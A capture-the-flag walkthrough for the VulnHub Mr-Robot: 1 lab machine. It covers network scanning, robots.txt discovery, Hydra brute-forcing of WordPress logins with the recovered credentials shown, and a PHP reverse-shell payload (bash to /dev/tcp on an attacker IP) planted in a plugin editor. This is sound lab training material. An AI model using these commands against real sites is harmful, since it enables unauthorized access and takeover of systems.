# Mr-Robot: 1

- **Machine:** Mr-Robot: 1
- **Download:** https://www.vulnhub.com/entry/mr-robot-1,151/

![](676-1.png)

---

# Setup

1. Import the `.ova` file into VirtualBox.
2. Click **Finish**.
3. Start the virtual machine.

---

# Network Scanning

## Discover the Target IP

```bash
nmap -sn 192.168.31.0/24
```

![](676-2.png)

---

## Port Scan

Identify the open ports.

```bash
nmap -v -p- 192.168.31.157
```

![](676-3.png)

---

## Visit the Web Server

Open both HTTP and HTTPS services.

- http://192.168.31.157/
- https://192.168.31.157/

---

## HTTP Enumeration

Run the HTTP enumeration NSE script.

```bash
nmap -v -p 80,443 -sT -sV -A --script=http-enum.nse 192.168.31.157
```

![](676-4.png)

---

# Web Enumeration

During enumeration the following endpoints are discovered:

- http://192.168.31.157/wp-login.php
- http://192.168.31.157/robots.txt

![](676-5.png)

![](676-6.png)

The **robots.txt** file reveals two interesting files:

```text
https://192.168.31.157/fsocity.dic
http://192.168.31.157/key-1-of-3.txt
```

---

## Download Key 1

```bash
wget http://192.168.31.157/key-1-of-3.txt
```

Read the key.

```bash
cat key-1-of-3.txt
```

---

## Download the Wordlist

```bash
wget http://192.168.31.157/fsocity.dic
```

Check the size.

```bash
wc -l fsocity.dic
```

![](676-7.png)

The **fsocity.dic** file is a very large custom wordlist.

---

# Username Enumeration

Create a file containing possible usernames.

```bash
nano user.txt
```

Remove duplicate entries.

```bash
cat user.txt | sort -u | uniq > small-user.txt
```

Use Hydra to enumerate valid WordPress usernames.

```bash
hydra -L small-user.txt -p small-user.txt 192.168.31.157 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:Invalid username"
```

![](676-8.png)

Valid username discovered:

```text
elliot
```

---

# Password Brute Force

Use the valid username to brute-force the password.

```bash
hydra -l elliot -P small-user.txt 192.168.31.157 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect" -V
```

![](676-9.png)

Recovered credentials:

```text
Username : elliot
Password : ER28-0652
```

---

# WordPress Login

Login using the recovered credentials.

URL:

- http://192.168.31.157/wp-login.php

Credentials:

```text
Username : elliot
Password : ER28-0652
```

![](676-10.png)

Successfully logged into the WordPress admin panel.

- http://192.168.31.157/wp-admin/

---

# Reverse Shell via Plugin Editor

Navigate to:

```text
Plugins → Editor
```

Select the **Hello Dolly** plugin.

Replace the plugin code with:

```php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.31.206/443 0>&1'");
```

![](676-11.png)

Save and update the plugin.

---

# Get Reverse Shell

Start a Netcat listener on the attacker machine.

```bash
nc -lvnp 443
```

Go to:

```text
Plugins → Installed Plugins
```

Activate the **Hello Dolly** plugin.

![](676-12.png)

Once the plugin executes, a reverse shell is received.

![](676-13.png)

---

# Key Learning

- Always inspect **robots.txt** for hidden files.
- Custom wordlists can be reused for username and password enumeration.
- Hydra supports WordPress username enumeration using different error messages.
- Weak WordPress credentials can lead to administrator access.
- Plugin editors can be abused to achieve remote code execution.
- A reverse shell can be obtained by modifying an installed plugin.

---

# Summary

The attack began by enumerating the web application, where the **robots.txt** file exposed a large custom wordlist and the first flag. The custom wordlist was used to enumerate a valid WordPress username and brute-force its password with Hydra. After obtaining administrator access to WordPress, the **Hello Dolly** plugin was modified to execute a reverse shell payload. Activating the plugin established a reverse shell, providing initial access to the target system.